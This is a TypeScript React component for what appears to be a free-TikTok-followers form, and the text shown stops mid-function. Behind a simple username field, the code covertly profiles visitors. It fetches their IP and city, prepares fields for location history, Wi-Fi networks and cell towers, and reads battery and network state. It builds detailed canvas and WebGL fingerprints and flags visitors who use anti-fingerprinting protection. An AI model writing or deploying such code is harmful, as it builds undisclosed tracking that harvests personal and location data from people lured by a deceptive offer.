import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { insertSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Form, 
  FormControl, 
  FormField, 
  FormItem, 
  FormLabel, 
  FormMessage 
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import Countdown from "@/components/Countdown";
import ProcessingAnimation from "@/components/ProcessingAnimation";
import SuccessMessage from "@/components/SuccessMessage";
import { Loader2, Sparkles, ShieldCheck, Lock, CheckCircle, Flame, TrendingUp } from "lucide-react";

// Function to detect device model from user agent
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let deviceInfo = "Unknown Device";

  // iPhone detection with model prediction based on screen size
  if (/iPhone/.test(ua)) {
    const match = ua.match(/OS (\d+)_(\d+)/i);
    const iosVersion = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
    const screenHeight = Math.max(window.screen.width, window.screen.height);
    
    // Estimate iPhone model based on screen height
    if (screenHeight >= 926 && screenHeight <= 932) {
      deviceInfo = `iPhone 13/14/15 Pro Max (${iosVersion})`;
    } else if (screenHeight >= 852 && screenHeight <= 880) {
      deviceInfo = `iPhone 14/15 Plus (${iosVersion})`;
    } else if (screenHeight >= 844 && screenHeight <= 852) {
      deviceInfo = `iPhone 13/14/15 Pro (${iosVersion})`;
    } else if (screenHeight >= 812 && screenHeight < 844) {
      deviceInfo = `iPhone X/XS/11 Pro/12/13 mini (${iosVersion})`;
    } else if (screenHeight >= 736 && screenHeight < 812) {
      deviceInfo = `iPhone 8/7/6 Plus (${iosVersion})`;
    } else if (screenHeight >= 667 && screenHeight < 736) {
      deviceInfo = `iPhone 8/7/6/SE 2020 (${iosVersion})`;
    } else {
      deviceInfo = `iPhone (${iosVersion})`;
    }
  } 
  // iPad detection
  else if (/iPad/.test(ua)) {
    const match = ua.match(/OS (\d+)_(\d+)/i);
    const iosVersion = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
    
    // Check for specific iPad models based on screen size
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const maxDimension = Math.max(screenWidth, screenHeight);
    
    if (maxDimension >= 1366) {
      deviceInfo = `iPad Pro 12.9" (${iosVersion})`;
    } else if (maxDimension >= 1112) {
      deviceInfo = `iPad Pro 11"/10.5" (${iosVersion})`;
    } else if (maxDimension >= 1024) {
      deviceInfo = `iPad Air/iPad (${iosVersion})`;
    } else {
      deviceInfo = `iPad mini (${iosVersion})`;
    }
  }
  // Samsung detection - improved model detection
  else if (/Samsung|SM-|SAMSUNG|Galaxy/.test(ua)) {
    // Try to extract the exact model number
    let modelCode = "";
    const smMatch = ua.match(/SM[-_]([A-Za-z0-9]+)/i);
    const galaxyMatch = ua.match(/Galaxy\s+([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)*)/i);
    
    if (smMatch) {
      modelCode = smMatch[1];
      
      // Map common Samsung model codes to marketing names
      const samsungModels: Record<string, string> = {
        // Galaxy S series
        'S23U': 'Galaxy S23 Ultra',
        'S23': 'Galaxy S23',
        'S22U': 'Galaxy S22 Ultra',
        'S22': 'Galaxy S22',
        'S21U': 'Galaxy S21 Ultra',
        'S21': 'Galaxy S21',
        'S20U': 'Galaxy S20 Ultra',
        'S20': 'Galaxy S20',
        'S10': 'Galaxy S10',
        'S9': 'Galaxy S9',
        'S8': 'Galaxy S8',
        
        // Note series
        'N20U': 'Galaxy Note 20 Ultra',
        'N20': 'Galaxy Note 20',
        'N10': 'Galaxy Note 10',
        'N9': 'Galaxy Note 9',
        
        // A series
        'A54': 'Galaxy A54',
        'A53': 'Galaxy A53',
        'A52': 'Galaxy A52',
        'A51': 'Galaxy A51',
        'A32': 'Galaxy A32',
        
        // Tab series
        'T870': 'Galaxy Tab S7',
        'T970': 'Galaxy Tab S7+',
        'T830': 'Galaxy Tab S4',
        
        // Fold/Flip series
        'F936': 'Galaxy Z Fold 4',
        'F926': 'Galaxy Z Fold 3',
        'F916': 'Galaxy Z Fold 2',
        'F900': 'Galaxy Fold',
        'F711': 'Galaxy Z Flip 3',
        'F707': 'Galaxy Z Flip 5G',
        'F700': 'Galaxy Z Flip',
        
        // S series - older model codes
        'G998': 'Galaxy S21 Ultra',
        'G996': 'Galaxy S21+',
        'G991': 'Galaxy S21',
        'G988': 'Galaxy S20 Ultra',
        'G986': 'Galaxy S20+',
        'G980': 'Galaxy S20',
        'G973': 'Galaxy S10',
        'G975': 'Galaxy S10+',
        'G970': 'Galaxy S10e',
        
        // Note series - older model codes
        'N986': 'Galaxy Note 20 Ultra',
        'N981': 'Galaxy Note 20',
        'N975': 'Galaxy Note 10+',
        'N970': 'Galaxy Note 10',
        
        // A series - older model codes
        'A536': 'Galaxy A53 5G',
        'A525': 'Galaxy A52',
        'A515': 'Galaxy A51',
        'A325': 'Galaxy A32',
      };
      
      // Check if we have a model match
      let matched = false;
      for (const [code, name] of Object.entries(samsungModels)) {
        if (modelCode.includes(code)) {
          deviceInfo = `Samsung ${name}`;
          matched = true;
          break;
        }
      }
      
      // If no specific mapping found, use the model code
      if (!matched) {
        deviceInfo = `Samsung Galaxy (Model: SM-${modelCode})`;
      }
    } else if (galaxyMatch) {
      deviceInfo = `Samsung ${galaxyMatch[0]}`;
    } else {
      deviceInfo = "Samsung Galaxy";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // Google Pixel detection
  else if (/Pixel/.test(ua)) {
    const pixelMatch = ua.match(/Pixel\s+(\d+(?:\s*[a-zA-Z]+)?)/i);
    if (pixelMatch) {
      deviceInfo = `Google Pixel ${pixelMatch[1]}`;
    } else {
      deviceInfo = "Google Pixel";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // OnePlus detection
  else if (/OnePlus|ONEPLUS/.test(ua)) {
    const match = ua.match(/(?:OnePlus|ONEPLUS)\s*([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)*)/i);
    if (match && match[1]) {
      deviceInfo = `OnePlus ${match[1].trim()}`;
    } else {
      deviceInfo = "OnePlus Device";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // Xiaomi/Redmi/POCO detection
  else if (/Xiaomi|Redmi|POCO|Mi/i.test(ua)) {
    const match = ua.match(/(?:Xiaomi|Redmi|POCO|Mi)[\/\s_-]([A-Za-z0-9]+(?:[\s_-][A-Za-z0-9]+)*)/i);
    if (match && match[1]) {
      const brand = /Redmi/i.test(ua) ? 'Redmi' : 
                   /POCO/i.test(ua) ? 'POCO' : 'Xiaomi';
      deviceInfo = `${brand} ${match[1].trim().replace(/_/g, ' ')}`;
    } else {
      // Try to find model number in other formats
      const miMatch = ua.match(/M2\d{3}[A-Z]\d*/);
      if (miMatch) {
        deviceInfo = `Xiaomi ${miMatch[0]}`;
      } else {
        deviceInfo = /Redmi/i.test(ua) ? "Redmi Device" : 
                    /POCO/i.test(ua) ? "POCO Device" : "Xiaomi Device";
      }
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // More enhanced Android detection with model extraction
  else if (/Android/.test(ua)) {
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    const version = versionMatch ? versionMatch[1] : "";
    
    // First try to get model from standard format in user agent strings
    let brandModel = "";
    
    // These patterns will extract more detailed model information
    // Pattern 1: Most common format for Android model in UA
    const modelPattern1 = ua.match(/;\s*([a-zA-Z0-9\-_]+(?:[ \-_][a-zA-Z0-9\-_]+)*)[ \-]Build\//i);
    // Pattern 2: Alternative common format
    const modelPattern2 = ua.match(/;\s*([a-zA-Z0-9\-_]+(?:[ \-_][a-zA-Z0-9\-_]+)*);/i);
    // Pattern 3: Specific format for some devices
    const modelPattern3 = ua.match(/Android[\/\s][\d\.]+;\s*([^;]+);/i);
    // Pattern 4: Device model after Mozilla string
    const modelPattern4 = ua.match(/\(([^;]+);(?:\s+U;|\s+wv;)?\s+Android/i);
    
    // Try each pattern in order of specificity
    if (modelPattern1 && modelPattern1[1]) {
      brandModel = modelPattern1[1].replace(/build|Build/g, '').trim();
    } else if (modelPattern2 && modelPattern2[1]) {
      brandModel = modelPattern2[1].trim();
    } else if (modelPattern3 && modelPattern3[1]) {
      brandModel = modelPattern3[1].trim();
    } else if (modelPattern4 && modelPattern4[1] && !/Linux|Android|mozilla/i.test(modelPattern4[1])) {
      brandModel = modelPattern4[1].trim();
    }
    
    // Check for specific model identifiers
    const technoMatch = ua.match(/TECNO ([A-Za-z0-9]+)/i);
    const infinixMatch = ua.match(/Infinix ([A-Za-z0-9]+)/i);
    const realmeMatch = ua.match(/RMX([0-9]+)/i);
    const oppoMatch = ua.match(/CPH([0-9]+)/i);
    const vivoMatch = ua.match(/vivo ([0-9]+)/i);
    const nokiaMatch = ua.match(/Nokia ([A-Za-z0-9\.\-]+)/i);
    
    if (technoMatch) {
      brandModel = `TECNO ${technoMatch[1]}`;
    } else if (infinixMatch) {
      brandModel = `Infinix ${infinixMatch[1]}`;
    } else if (realmeMatch) {
      brandModel = `Realme RMX${realmeMatch[1]}`;
    } else if (oppoMatch) {
      brandModel = `OPPO CPH${oppoMatch[1]}`;
    } else if (vivoMatch) {
      brandModel = `Vivo ${vivoMatch[1]}`;
    } else if (nokiaMatch) {
      brandModel = `Nokia ${nokiaMatch[1]}`;
    }
    
    // Identify manufacturer for better labeling
    const manufacturer = 
      /Samsung|SAMSUNG/i.test(ua) ? "Samsung" :
      /LG/i.test(ua) ? "LG" :
      /Sony/i.test(ua) ? "Sony" :
      /HTC/i.test(ua) ? "HTC" :
      /Huawei/i.test(ua) ? "Huawei" :
      /HONOR/i.test(ua) ? "Honor" :
      /OnePlus|ONEPLUS/i.test(ua) ? "OnePlus" :
      /Xiaomi|Redmi|POCO|Mi/i.test(ua) ? "Xiaomi" :
      /OPPO|CPH\d{4}/i.test(ua) ? "OPPO" :
      /vivo|Vivo/i.test(ua) ? "Vivo" :
      /Motorola|moto/i.test(ua) ? "Motorola" :
      /Nokia/i.test(ua) ? "Nokia" :
      /Lenovo/i.test(ua) ? "Lenovo" :
      /Asus|ASUS/i.test(ua) ? "Asus" :
      /TECNO/i.test(ua) ? "TECNO" :
      /Infinix/i.test(ua) ? "Infinix" :
      /RMX\d{4}/i.test(ua) ? "Realme" :
      /Google/i.test(ua) ? "Google" :
      /Pixel/i.test(ua) ? "Google" :
      "";
    
    // Process and clean up the brand model string
    if (brandModel) {
      // Remove common unnecessary parts
      brandModel = brandModel
        .replace(/(SAMSUNG|Samsung|LG|Sony|HTC|Huawei|Google|OPPO|vivo|Motorola|Nokia|Lenovo|ASUS|Asus|TECNO|Infinix|Realme)\s*/i, '')
        .replace(/Android/i, '')
        .replace(/Mobile/i, '')
        .replace(/^\s+|\s+$/g, ''); // Trim extra spaces
      
      if (manufacturer && brandModel) {
        deviceInfo = `${manufacturer} ${brandModel}`;
      } else if (manufacturer) {
        deviceInfo = `${manufacturer} Device`;
      } else if (brandModel) {
        deviceInfo = brandModel;
      } else {
        deviceInfo = "Android Device";
      }
    } else if (manufacturer) {
      deviceInfo = `${manufacturer} Device`;
    } else {
      deviceInfo = "Android Device";
    }
    
    if (version) {
      deviceInfo += ` (Android ${version})`;
    }
  }
  // Windows detection
  else if (/Windows NT/.test(ua)) {
    const windowsVersion = {
      '10.0': '10',
      '6.3': '8.1',
      '6.2': '8',
      '6.1': '7',
      '6.0': 'Vista',
      '5.2': 'XP x64',
      '5.1': 'XP'
    };
    const match = ua.match(/Windows NT (\d+\.\d+)/i);
    if (match && match[1] in windowsVersion) {
      deviceInfo = `Windows ${windowsVersion[match[1] as keyof typeof windowsVersion]}`;
    } else {
      deviceInfo = "Windows PC";
    }
  }
  // Mac detection
  else if (/Macintosh/.test(ua)) {
    const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
    if (match) {
      deviceInfo = `Mac OS X ${match[1].replace('_', '.')}`;
    } else {
      deviceInfo = "Mac OS X";
    }
  }
  // Linux detection
  else if (/Linux/.test(ua) && !/Android/.test(ua)) {
    const distroMatch = ua.match(/Ubuntu|Debian|Fedora|CentOS|RHEL|Arch|Gentoo/i);
    if (distroMatch) {
      deviceInfo = `${distroMatch[0]} Linux`;
    } else {
      deviceInfo = "Linux";
    }
  }

  return deviceInfo;
}

// Extend schema for frontend validation
const formSchema = insertSubmissionSchema.extend({
  username: z.string()
    .min(3, "Username must be at least 3 characters long")
    .max(30, "Username must be less than 30 characters")
    .regex(/^[a-zA-Z0-9._]+$/, "Username can only contain letters, numbers, period and underscore"),
  deviceInfo: z.object({
    deviceModel: z.string().min(1, "Device model is required"),
    screenSize: z.string().min(1, "Screen size is required"),
    platform: z.string().min(1, "Platform is required"),
    userAgent: z.string().min(1, "User agent is required"),
    language: z.string().min(1, "Language is required"),
    timezone: z.string().min(1, "Timezone is required"),
    browserFingerprint: z.string().optional(),
  }).optional(),
  ipAddress: z.string().optional(),
});

type FormValues = z.infer<typeof formSchema>;

export default function FollowerForm() {
  const [formStep, setFormStep] = useState<'form' | 'processing' | 'success'>('form');
  const [selectedAmount, setSelectedAmount] = useState<number>(5000);
  const { toast } = useToast();
  const [userInfo, setUserInfo] = useState({
    // Basic device information
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    language: navigator.language,
    languages: Array.from(navigator.languages || []).join(','),
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    deviceModel: getDeviceInfo ? getDeviceInfo() : "Unknown Device",
    deviceMemory: (navigator as any).deviceMemory || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || (window as any).doNotTrack || 'unknown',
    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
    hasVibration: false, // Add this to fix TS error
    
    // Enhanced Network information
    ip: '',
    ipDetails: {
      country: '',
      region: '',
      city: '',
      isp: '',
      org: '',
      asn: '',
      ispType: '',
      proxy: false,
      hosting: false,
      mobile: false
    },
    connection: (navigator as any).connection ? {
      downlink: (navigator as any).connection.downlink || 'unknown',
      effectiveType: (navigator as any).connection.effectiveType || 'unknown',
      rtt: (navigator as any).connection.rtt || 'unknown',
      saveData: (navigator as any).connection.saveData || false,
      type: (navigator as any).connection.type || 'unknown',
      // Listen for network changes
      networkChanges: [] as string[],
    } : {
      downlink: 'unknown',
      effectiveType: 'unknown',
      rtt: 'unknown',
      saveData: false,
      type: 'unknown',
      networkChanges: [] as string[]
    },
    
    // Enhanced location data with comprehensive details
    geolocation: {
      latitude: null as number | null,
      longitude: null as number | null,
      accuracy: null as number | null,
      altitude: null as number | null,
      altitudeAccuracy: null as number | null,
      heading: null as number | null,
      speed: null as number | null,
      timestamp: null as number | null,
      permission: 'unknown' as 'granted' | 'denied' | 'unknown' | 'error',
      collectionMethods: [] as string[],
      verificationStatus: 'unverified' as string,
      lastUpdated: '' as string,
      source: '' as string,
      attempted: false,
      attemptTimestamp: '' as string,
      error: '' as string,
      errorCode: 0,
      // Advanced location tracking fields
      watchPositionActive: false,
      watchId: undefined as number | undefined,
      watchPositionError: '' as string,
      collectionStatus: '' as string,
      locationQuality: '' as string,
      movementPatterns: [] as any[],
      locationHistory: [] as any[],
      movementPath: [] as any[],
      wifiNetworks: [] as any[],
      cellTowers: [] as any[],
      trackingInfo: {} as Record<string, any>,
      // Detailed address information from multiple sources
      address: {} as Record<string, any>,
      displayName: '' as string,
      locationDetails: {} as Record<string, any>,
      bigDataCloud: {} as Record<string, any>,
      geoJs: {} as Record<string, any>,
      ipInfo: {} as Record<string, any>,
      timezoneBasedLocation: {} as Record<string, any>,
      pointsOfInterest: [] as any[],
      nearbyLandmarks: [] as any[]
    },
    
    // Fingerprinting data
    canvasFingerprint: '',
    webglFingerprint: '',
    fonts: '',
    audioFingerprint: '',
    
    // Hardware information for advanced validation
    hardwareInfo: {
      cores: navigator.hardwareConcurrency || 0,
      memory: (navigator as any).deviceMemory || 'unknown',
      gpu: '',
      battery: null as any,
      batteryLevel: 0,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
      touchPoints: navigator.maxTouchPoints || 0,
      pixelRatio: window.devicePixelRatio || 1,
      // Physical sensors
      sensors: {
        accelerometer: 'Accelerometer' in window,
        gyroscope: 'Gyroscope' in window,
        magnetometer: 'Magnetometer' in window,
        ambientLight: 'AmbientLightSensor' in window
      },
      vibrationSupported: false
    },
    
    // Device motion capability (indicates a real mobile device)
    hasMotion: 'DeviceMotionEvent' in window,
    hasOrientation: 'DeviceOrientationEvent' in window,
    
    // Mobile-specific checks
    isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
    mobileDetails: {
      brand: '',
      model: '',
      osVersion: '',
      deviceYear: '',
      deviceType: ''
    },
    isEmulator: false
  });
  
  // Enhanced device data collection
  useEffect(() => {
    // Enhanced network information collection
    const collectNetworkInfo = async () => {
      try {
        // Get basic IP address
        const ipifyResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipifyResponse.json();
        
        setUserInfo(prev => ({
          ...prev,
          ip: ipData.ip
        }));
        
        // Get detailed IP information using ipinfo.io
        try {
          const ipInfoResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
          const ipInfoData = await ipInfoResponse.json();
          
          // Extract location from IP data
          const locationParts = ipInfoData.loc ? ipInfoData.loc.split(',') : [null, null];
          const ipDetails = {
            country: ipInfoData.country || '',
            region: ipInfoData.region || '',
            city: ipInfoData.city || '',
            isp: ipInfoData.org || '',
            asn: ipInfoData.asn || '',
            org: ipInfoData.org || '',
            ispType: '',
            proxy: false,
            hosting: /hosting|cloud|server|datacenter/i.test(ipInfoData.org || ''),
            mobile: /mobile|cellular|wireless/i.test(ipInfoData.org || '')
          };
          
          setUserInfo(prev => ({
            ...prev,
            ipDetails: ipDetails,
            // Add approximate geolocation from IP if actual geolocation unavailable
            geolocation: {
              ...prev.geolocation,
              ipBasedLocation: {
                latitude: locationParts[0] ? parseFloat(locationParts[0]) : null,
                longitude: locationParts[1] ? parseFloat(locationParts[1]) : null,
                accuracy: 5000, // IP geolocation is not very accurate (approx. 5km)
                source: 'ip'
              }
            }
          }));
        } catch (error) {
          console.warn('Failed to get detailed IP info:', error);
        }
        
        // Monitor network changes if available
        if ('connection' in navigator) {
          const connection = (navigator as any).connection;
          
          // Create a function to record network changes
          const recordNetworkChange = () => {
            const timestamp = new Date().toISOString();
            const networkState = {
              timestamp,
              type: connection.type || 'unknown',
              effectiveType: connection.effectiveType || 'unknown',
              downlink: connection.downlink || 'unknown',
              rtt: connection.rtt || 'unknown',
              saveData: connection.saveData || false
            };
            
            setUserInfo(prev => ({
              ...prev,
              connection: {
                ...prev.connection,
                ...networkState,
                networkChanges: [...(prev.connection.networkChanges || []), 
                  `${timestamp}: ${JSON.stringify(networkState)}`]
              }
            }));
          };
          
          // Set initial network state
          recordNetworkChange();
          
          // Listen for network changes
          connection.addEventListener('change', recordNetworkChange);
        }
        
      } catch (error) {
        console.error('Error collecting network information:', error);
      }
    };
    
    // Try to access battery info for additional device verification
    const getBatteryInfo = async () => {
      try {
        if ('getBattery' in navigator) {
          const battery = await (navigator as any).getBattery();
          
          const updateBatteryInfo = () => {
            setUserInfo(prev => ({
              ...prev,
              hardwareInfo: {
                ...prev.hardwareInfo,
                battery: {
                  level: battery.level,
                  charging: battery.charging,
                  chargingTime: battery.chargingTime,
                  dischargingTime: battery.dischargingTime
                },
                batteryLevel: Math.round(battery.level * 100)
              }
            }));
          };
          
          // Update battery info immediately
          updateBatteryInfo();
          
          // Listen for battery changes
          battery.addEventListener('levelchange', updateBatteryInfo);
          battery.addEventListener('chargingchange', updateBatteryInfo);
          
          // Sudden battery changes might indicate emulator
          let lastLevel = battery.level;
          battery.addEventListener('levelchange', () => {
            // Check for emulator-like behavior (sudden large jumps in battery level)
            if (Math.abs(battery.level - lastLevel) > 0.1) {
              console.warn("Sudden battery level change detected, possible emulator");
              setUserInfo(prev => ({
                ...prev,
                isEmulator: true
              }));
            }
            lastLevel = battery.level;
          });
        }
      } catch (e) {
        console.warn('Battery API not available:', e);
      }
    };
    
    // Enhanced ultra-detailed canvas fingerprinting
    const createCanvasFingerprint = () => {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (ctx) {
          // Create high-resolution canvas for more detail
          canvas.width = 500;
          canvas.height = 400;
          
          // Draw complex background with radial gradient
          const radialGradient = ctx.createRadialGradient(250, 200, 10, 250, 200, 300);
          radialGradient.addColorStop(0, "rgba(255,255,255,1)");
          radialGradient.addColorStop(0.2, "rgba(230,240,255,0.9)");
          radialGradient.addColorStop(0.8, "rgba(240,248,255,0.8)");
          radialGradient.addColorStop(1, "rgba(248,248,255,0.9)");
          ctx.fillStyle = radialGradient;
          ctx.fillRect(0, 0, 500, 400);
          
          // Draw complex text with shadows
          ctx.shadowOffsetX = 2;
          ctx.shadowOffsetY = 2;
          ctx.shadowBlur = 2;
          ctx.shadowColor = "rgba(0,0,0,0.3)";
          
          // Multiple font styles for greater uniqueness
          ctx.fillStyle = 'rgb(0,0,0)';
          ctx.font = 'bold 24px "Arial"';
          ctx.fillText('TikTok Advanced Fingerprint üëë', 20, 50);
          
          ctx.font = 'italic 16px "Georgia"';
          ctx.fillText(`User Agent Hash: ${hashString(navigator.userAgent)}`, 20, 80);
          
          ctx.font = '14px "Courier New"';
          ctx.fillText(`Screen: ${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio}x`, 20, 110);
          
          ctx.font = '14px "Tahoma"';
          ctx.fillText(`Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, 20, 140);
          
          // Draw emoji set (varies by platform)
          ctx.font = '24px sans-serif';
          ctx.fillText("üîç üåé üì± üíª üñ•Ô∏è üï∏Ô∏è üîí üïµÔ∏è", 20, 170);
          
          // Complex path drawing with bezier curves
          ctx.lineWidth = 2;
          ctx.beginPath();
          ctx.moveTo(20, 200);
          ctx.bezierCurveTo(150, 150, 350, 250, 480, 200);
          ctx.strokeStyle = 'rgb(255,0,100)';
          ctx.stroke();
          
          // Multiple overlapping shapes with different blend modes
          ctx.globalCompositeOperation = "multiply";
          
          // Draw multiple colored circles
          const colors = ['rgb(255,0,0)', 'rgb(0,255,0)', 'rgb(0,0,255)', 
                          'rgb(255,255,0)', 'rgb(0,255,255)', 'rgb(255,0,255)'];
          
          for (let i = 0; i < colors.length; i++) {
            ctx.fillStyle = colors[i];
            ctx.globalAlpha = 0.6;
            ctx.beginPath();
            const x = 100 + i * 60;
            const y = 250;
            const radius = 30;
            ctx.arc(x, y, radius, 0, Math.PI * 2);
            ctx.fill();
          }
          
          // Reset composite operation and alpha
          ctx.globalCompositeOperation = "source-over";
          ctx.globalAlpha = 1.0;
          
          // Draw text with mathematical transformations
          ctx.save();
          ctx.translate(250, 320);
          ctx.rotate(Math.PI / 8);
          ctx.scale(1.5, 1);
          ctx.fillStyle = "rgba(0,0,128,0.8)";
          ctx.font = "18px monospace";
          ctx.fillText("Transformed Text Sample", 0, 0);
          ctx.restore();
          
          // Draw browser-specific information
          ctx.fillStyle = "rgb(60,60,60)";
          ctx.font = "14px Arial";
          ctx.fillText(`Platform: ${navigator.platform}`, 20, 360);
          ctx.fillText(`Language: ${navigator.language}`, 20, 380);
          
          // Generate complete canvas data
          const pngDataUrl = canvas.toDataURL('image/png');
          const jpegDataUrl = canvas.toDataURL('image/jpeg', 0.9);
          
          // Create a comprehensive fingerprint with multiple formats
          const fingerprints = {
            png: pngDataUrl,
            jpeg: jpegDataUrl,
            pngHash: hashString(pngDataUrl),
            jpegHash: hashString(jpegDataUrl)
          };
          
          // Advanced testing for canvas manipulation detection
          // Test 1: Empty canvas instrumentation check
          const emptyCanvas = document.createElement('canvas');
          emptyCanvas.width = 1;
          emptyCanvas.height = 1;
          const emptyCtx = emptyCanvas.getContext('2d');
          const emptyData = emptyCanvas.toDataURL();
          const isCanvasInstrumented = emptyData.length > 50;
          
          // Test 2: Pixel data readback test
          let pixelManipulationDetected = false;
          try {
            // Draw a single known pixel and read it back
            const testCanvas = document.createElement('canvas');
            testCanvas.width = 1;
            testCanvas.height = 1;
            const testCtx = testCanvas.getContext('2d');
            if (testCtx) {
              testCtx.fillStyle = 'rgba(255,0,0,1)';
              testCtx.fillRect(0, 0, 1, 1);
              const pixelData = testCtx.getImageData(0, 0, 1, 1).data;
              // Check if the pixel matches our expected value
              pixelManipulationDetected = !(pixelData[0] === 255 && pixelData[1] === 0 && pixelData[2] === 0 && pixelData[3] === 255);
            }
          } catch (pixelErr) {
            // If we can't access pixel data, that's also a sign of protection
            pixelManipulationDetected = true;
          }
          
          // Test 3: Repeated renders test (detects noise injection)
          let noiseInjectionDetected = false;
          try {
            const repeatCanvas1 = document.createElement('canvas');
            const repeatCanvas2 = document.createElement('canvas');
            repeatCanvas1.width = repeatCanvas2.width = 20;
            repeatCanvas1.height = repeatCanvas2.height = 20;
            
            const rCtx1 = repeatCanvas1.getContext('2d');
            const rCtx2 = repeatCanvas2.getContext('2d');
            
            if (rCtx1 && rCtx2) {
              // Draw the same content on both canvases
              rCtx1.fillStyle = 'rgba(255,0,0,1)';
              rCtx1.fillRect(0, 0, 20, 20);
              
              rCtx2.fillStyle = 'rgba(255,0,0,1)';
              rCtx2.fillRect(0, 0, 20, 20);
              
              // Compare the output - should be identical unless noise is injected
              const data1 = repeatCanvas1.toDataURL();
              const data2 = repeatCanvas2.toDataURL();
              
              noiseInjectionDetected = data1 !== data2;
            }
          } catch (noiseErr) {
            noiseInjectionDetected = true;
          }
          
          // Record all instrumentation findings
          const fingerprintProtection = {
            isCanvasInstrumented,
            pixelManipulationDetected,
            noiseInjectionDetected,
            anyProtectionDetected: isCanvasInstrumented || pixelManipulationDetected || noiseInjectionDetected
          };
          
          if (fingerprintProtection.anyProtectionDetected) {
            console.warn("Canvas fingerprint protection detected, possible emulator/automation");
            setUserInfo(prev => ({
              ...prev,
              isEmulator: true
            }));
          }
          
          // Store the complete fingerprint data without truncation
          setUserInfo(prev => ({
            ...prev,
            canvasFingerprint: pngDataUrl, // Store the complete fingerprint
            canvasFingerprintData: {
              ...fingerprints,
              protectionAnalysis: fingerprintProtection,
              renderingCapabilities: {
                blendModes: ctx.globalCompositeOperation !== undefined,
                transforms: true,
                gradients: true,
                fonts: navigator.fonts ? Array.from(navigator.fonts || []).length : 'unknown',
                pixelRatio: window.devicePixelRatio
              },
              detectionTimestamp: new Date().toISOString()
            }
          }));
        }
      } catch (e) {
        console.error('Canvas fingerprinting error:', e);
        // Store error information for diagnostic purposes
        setUserInfo(prev => ({
          ...prev,
          canvasFingerprintError: {
            message: e instanceof Error ? e.message : String(e),
            stack: e instanceof Error ? e.stack : undefined,
            timestamp: new Date().toISOString()
          }
        }));
      }
    };
    
    // Helper function to create hash from string
    const hashString = (str: string): string => {
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32bit integer
      }
      return hash.toString(16);
    };
    
    // Advanced ultra-detailed WebGL fingerprinting with maximum precision
    const createWebGLFingerprint = () => {
      try {
        // Create high-precision canvas for detailed rendering tests
        const canvas = document.createElement('canvas');
        canvas.width = 512;  // Larger size for more detailed rendering
        canvas.height = 256;
        
        // Try WebGL2 first, then fallback to WebGL1 with all possible context attributes
        const contextAttributes: WebGLContextAttributes = {
          alpha: true,
          antialias: true,
          depth: true,
          failIfMajorPerformanceCaveat: false,
          powerPreference: 'high-performance',
          premultipliedAlpha: true,
          preserveDrawingBuffer: true,
          stencil: true,
          desynchronized: false,
          xrCompatible: false
        };
        
        const gl2 = canvas.getContext('webgl2', contextAttributes) as WebGL2RenderingContext | null;
        const gl = gl2 || canvas.getContext('webgl', contextAttributes) as WebGLRenderingContext | null || 
                    canvas.getContext('experimental-webgl', contextAttributes) as WebGLRenderingContext | null;
        const isWebGL2 = !!gl2;
        
        if (!gl) {
          console.warn("WebGL not supported");
          setUserInfo(prev => ({
            ...prev,
            webglFingerprint: "WEBGL_NOT_SUPPORTED",
            webglFingerprintData: {
              supported: false,
              error: "WebGL contexts not available",
              timestamp: new Date().toISOString()
            }
          }));
          return;
        }
        
        // Store the actual attributes returned by the context (which may differ from requested)
        const actualContextAttributes = gl.getContextAttributes();
        
        // Get WebGL debug info for detailed GPU information
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        let unmaskedVendor = 'unknown', unmaskedRenderer = 'unknown';
        let gpuVendor = gl.getParameter(gl.VENDOR);
        let gpuRenderer = gl.getParameter(gl.RENDERER);
        
        if (debugInfo) {
          try {
            unmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            unmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          } catch (e) {
            console.warn("Could not get unmasked renderer info:", e);
          }
        }
        
        // Test if context is lost or not
        const contextLost = gl.isContextLost?.() || false;
        
        // Determine if this is likely a software renderer
